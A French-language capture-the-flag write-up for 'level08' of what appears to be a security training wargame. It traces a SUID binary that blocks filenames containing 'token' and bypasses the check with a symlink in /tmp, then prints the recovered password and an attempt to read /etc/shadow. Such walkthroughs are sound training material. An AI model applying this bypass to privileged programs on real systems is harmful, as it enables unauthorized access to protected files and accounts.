# level 08 

En executant ```ls -la``` on constate qu'on a deux files: 
- level08, un executable avec le SUID et GUID set;
- token, un fichier sur lequel on a aucune autorisation.

En executant ```./level08``` on a l'output suivant : ```./level08 [file to read]```

On peut donc en deduire qu'on doit passer ```token``` a ```level08```.
```bash
./level08 token
You may not access 'token'
```
L'output est etrange, ca ne ressemble pas aux erreurs d'authorisation habituelles. Du coup on reessaye avec un autre file.

```bash
./level08 /etc/shadow
evel08: Unable to open /etc/shadow: Permission denied
```
En fait, il s'agit d'une erreur qui s'affiche des que le ficher passe a l executable contient la string "token".

```bash
./level08 /cereponexistepas/token
You may not access '/cereponexistepas/token'
```

On peut s en convaincre avec la commande ```ltrace``` qui donne l'output suivant si ./level08 est appele sur token :

```bash
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                       = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                   = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

La fonction ```strstr``` verifie si "token" est contenu dans le parametre passe a l executable, et si oui, print la phrase ```You may not access``` le_nom_du_fichier qui contient "token".

On pourrait essayer de changer le nom du file, mais on a aucun droit dans le repertoire courant, et on ne peut pas non plus copier token vers /tmp ou on a un peu de liberte.

La solution est donc de partir de la ou on a un peu de liberte : creer un file dans /tmp qui renvoie vers le fichier token. Un lien. 

```bash
ln -s /home/user/level08/token /tmp/toklink
./level08 /tmp/toklink
quif5eloekouj29ke0vouxean
```

On peut alors se log sur flag08 et executer la commande getflag pour se log sur le level09.